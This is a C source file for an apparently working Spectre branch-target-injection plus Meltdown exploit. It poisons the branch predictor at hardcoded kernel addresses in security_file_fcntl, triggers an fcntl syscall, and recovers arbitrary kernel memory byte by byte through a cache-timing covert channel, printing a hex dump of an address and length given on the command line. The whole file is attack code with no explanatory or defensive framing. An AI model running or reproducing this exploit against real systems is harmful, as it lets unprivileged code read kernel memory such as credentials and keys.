#include <stdio.h>
#include <stdlib.h>
#include <syscall.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <signal.h>
#include <unistd.h>
#include <ucontext.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/mman.h>


extern void clflush(const void *ptr);
extern void mfence(void);
extern uint64_t measure_access_time(void *ptr);
extern void do_access(uint8_t *our_buffer, uint8_t *ptr);
extern void *after_exception;
extern uint8_t btb_call;
extern uint8_t btb_gadget;


#define SPACED_OUT __attribute__ ((aligned (0x100000))) 

#define L3_CACHE_SIZE (4 * 1024 * 1024)

#define CACHE_ELEMS (256)
#define CACHE_ELEM_SIZE (4096)

// jmpq in security_file_fcntl
#define CALL_ADDR   ((0xffffffff81234733ULL) & 0x000000ffffffffff)
// proximal mov 8(%rdx) gadget
#define GADGET_ADDR ((0xffffffff8123663dULL) & 0x000000ffffffffff)
#define GADGET_RDX_OFFSET (8)

#define MIN_VARIANCE_MULT (3)
#define BYTE_READ_ATTEMPTS (10000)
#define BYTE_CONFIDENCE_THRESH (3)
#define ZERO_CONFIDENCE_THRESH (100)


typedef void (call_addr_func_t)(void *ptr);

typedef struct {
    uint32_t delta;
    uint8_t byte;
} timed_byte_t;

typedef struct {
    uint8_t _a[4096];
    uint8_t buffer[CACHE_ELEMS * CACHE_ELEM_SIZE];
    uint8_t _b[4096];
} protected_buffer_t;


// This is the buffer that will act as a covert channel to the speculatively executed code
SPACED_OUT protected_buffer_t our_buffer = {0};
int fcntl_fd = -1;
// This buffer is used simply to evict the L3/L2 cache
SPACED_OUT uint8_t l3_cache_sized_buffer[L3_CACHE_SIZE] = {0};


void sighandler(int sig, siginfo_t *info, void *_context)
{
    ucontext_t *context = (ucontext_t *)(_context);
    // Upon a segfault, simply skip to the end of the "do_access" code
    context->uc_mcontext.gregs[REG_RIP] = (uint64_t)(&after_exception);
}

void evict_our_buffer(void)
{
    uint64_t i = 0;

    for (i = 0; i < CACHE_ELEMS; i++) {
        our_buffer.buffer[i * CACHE_ELEM_SIZE] = 0;
    }

    for (i = 0; i < CACHE_ELEMS; i++) {
        clflush(&our_buffer.buffer[i * CACHE_ELEM_SIZE]);
    }

    mfence();
}

uint32_t evict_l3_cache()
{   
    uint64_t i = 0;
    uint32_t sum = 0;

    for (i = 0; i < sizeof(l3_cache_sized_buffer); i += 64) {
        sum += l3_cache_sized_buffer[i];
    }

    return sum;
}

bool measure_memory_byte_once(uint8_t *ptr, uint8_t *out_byte)
{
    timed_byte_t access_times[CACHE_ELEMS] = {0};
    uint64_t i = 0;

    evict_l3_cache();
    evict_our_buffer();

    // Perform Spectre branch target injection once 
    ((call_addr_func_t *)(CALL_ADDR))((void *)GADGET_ADDR);
    // Trigger the indirect jmp security_ops->file_fcntl(file, cmd, arg), hoping that security_ops is uncached
    syscall(__NR_fcntl, fcntl_fd, 0, ((uint64_t)ptr) - GADGET_RDX_OFFSET);

    // Perform Meltdown attack on now hopefully cached data
    do_access(our_buffer.buffer, ptr);
    mfence();

    for (i = 0; i < CACHE_ELEMS; i++) {
        access_times[i].delta = measure_access_time(&our_buffer.buffer[i * CACHE_ELEM_SIZE]);
        access_times[i].byte = i;
    }

    // Sort the access_times array by the access times
    int cmp(const void *a, const void *b) {
        return ((timed_byte_t *)(a))->delta - ((timed_byte_t *)(b))->delta;
    }
    qsort(access_times, CACHE_ELEMS, sizeof(access_times[i]), cmp);

    // Check that there is a significant variance between the min access_time to the next access_time
    if (access_times[0].delta * MIN_VARIANCE_MULT < access_times[1].delta) {
        *out_byte = access_times[0].byte;
        return true;

    } else {
        // We got noise :(
        *out_byte = 0;
        return false;
    }
}

bool read_memory_byte(uint8_t *ptr, uint8_t *out_byte)
{
    uint64_t i = 0;
    uint8_t byte_scores[0x100] = {0};

    // Make a bunch of attempts, as some may fail due to noise
    for (i = 0; i < BYTE_READ_ATTEMPTS; i += 1) {
        if (measure_memory_byte_once(ptr, out_byte)) {
            byte_scores[*out_byte] += 1;

            if (*out_byte != 0 && byte_scores[*out_byte] > BYTE_CONFIDENCE_THRESH) {
                return true;
            }
        }
    }

    // The byte could be 0
    if (byte_scores[0] > ZERO_CONFIDENCE_THRESH) {
        *out_byte = 0;
        return true;
    }

    return false;
}

void dump_memory(uint8_t *ptr, uint32_t size)
{
    uint64_t i = 0;
    uint8_t byte = 0;

    for (i = 0; i < size; i += 1) {
        if (i % 0x10 == 0 && i != 0) {
            printf("\n");
        }

        if (read_memory_byte(ptr + i, &byte)) {
            printf("%02x ", byte);
            fflush(stdout);
        } else {
            printf("?? ");
        }
    }

    printf("\n");
}

int main(int argc, const char *argv[])
{
    struct sigaction sa;
    sa.sa_sigaction = sighandler;
    sa.sa_flags = SA_SIGINFO;
    uint64_t addr = 0;
    uint32_t len = 0;
    uint8_t *btb_page = NULL;

    if (argc < 3) {
        printf("usage: <addr> <len>");
        return 0;
    }

    addr = strtoull(argv[1], NULL, 0);
    len = strtoul(argv[2], NULL, 0);

    sigaction(SIGSEGV, &sa, NULL);

    // Just some file to get an fd
    fcntl_fd = open("/etc/passwd", O_RDONLY);
    assert(fcntl_fd > -1);

    btb_page = mmap((void*)(CALL_ADDR & 0xfffffff000),
                    0x100000,
                    PROT_READ | PROT_WRITE | PROT_EXEC,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    assert((uint64_t)btb_page == (CALL_ADDR & 0xfffffff000));

    /* copy btb_call and btb_gadget */
    memcpy((void *)(CALL_ADDR), &btb_call, 0x100);
    memcpy((void *)(GADGET_ADDR), &btb_gadget, 0x100);

    dump_memory((uint8_t *)(addr), len);

    return 0;
}
